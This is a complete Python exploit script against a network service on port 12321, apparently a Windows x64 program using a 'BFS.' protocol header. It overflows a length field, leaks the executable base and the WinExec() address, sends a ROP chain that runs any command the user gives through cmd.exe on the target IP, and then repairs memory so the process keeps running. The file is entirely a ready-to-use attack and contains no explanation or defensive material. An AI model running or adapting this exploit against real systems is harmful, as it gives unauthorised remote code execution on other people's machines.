
import sys
import struct
import socket

PORT = 12321
COOKIE = b"BFS."

ROP_POP_RAX              = 0x3d4b
ROP_POP_RBX              = 0x1da2
ROP_MOV_RCX_RBX_CALL_RAX = 0x2afa
ROP_POP_RDI              = 0x1aa5
ROP_ADD_ESP_EDI          = 0x5bfd
CMD_END                  = 0xe5b0
SAFE_CONTINUE            = 0x15f0

if (len(sys.argv) != 3):
	print(f"Usage: python3 {sys.argv[0]} <ip> <cmd>")
	print(f"Example: python3 {sys.argv[0]} 192.168.1.100 calc.exe")
	exit(0)
else:
	HOST = sys.argv[1]
	CMD = f"cmd.exe /c \"{sys.argv[2]}\"&&".encode()

if len(CMD) > 252:
	print("Error: Command too long, exploit will fail. Ensure len(cmd) <= 252.")
	exit(0)

def send(data):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((HOST, PORT))
	s.send(data)
	return s.recv(0x1000)

print("Stage 1: overwriting length value...")

send(COOKIE + struct.pack("<L", 254) + b"A"*252 + b"\x40\x08")

print("Stage 2: Leaking useful pointers...")

resp = send(COOKIE + struct.pack("<L", 254) + b"A"*252 + b"\x40\x08")

exe_baseaddr = struct.unpack("<Q", resp[0x130:0x138])[0] & 0xFFFFFFFFFFFF0000
winexec_addr = struct.unpack("<Q", resp[0x918:0x920])[0]

print(f" Leaked EXE base-address  @ {exe_baseaddr:016x}")
print(f" Leaked WinExec() pointer @ {winexec_addr:016x}")

print(f"Stage 3: Executing '{CMD[12:-3].decode()}'...")

send(
	COOKIE + struct.pack("<L", 254) +
	b"A"*(252 - len(CMD)) + CMD +
	struct.pack("<L", 0x01010101) +
	b"\x03BBB" + b"B"*24 +
	struct.pack("<Q", exe_baseaddr + ROP_POP_RDI) +
	b"C"*4 +
	struct.pack("<Q", exe_baseaddr + ROP_POP_RAX) +
	struct.pack("<Q", exe_baseaddr + ROP_POP_RBX) +
	struct.pack("<Q", exe_baseaddr + ROP_POP_RBX) +
	struct.pack("<Q", exe_baseaddr + (CMD_END - len(CMD))) +
	struct.pack("<Q", exe_baseaddr + ROP_MOV_RCX_RBX_CALL_RAX) +
	struct.pack("<Q", winexec_addr) +
	struct.pack("<Q", exe_baseaddr + SAFE_CONTINUE) +
	b"D"*8 +
	struct.pack("<Q", 0xffffffffffffffc0) +
	struct.pack("<Q", exe_baseaddr + ROP_ADD_ESP_EDI)
)

print(f" Pwned!")

print(f"Stage 4: Repairing memory to stabilize process...")

send(COOKIE + struct.pack("<L", 256) + b"A"*252 + b"AAA\x00")
send(COOKIE + struct.pack("<L", 256) + b"A"*252 + b"AA\x00")
send(COOKIE + struct.pack("<L", 256) + b"A"*252 + b"A\x00")
send(COOKIE + struct.pack("<L", 256) + b"A"*252 + b"\x00")

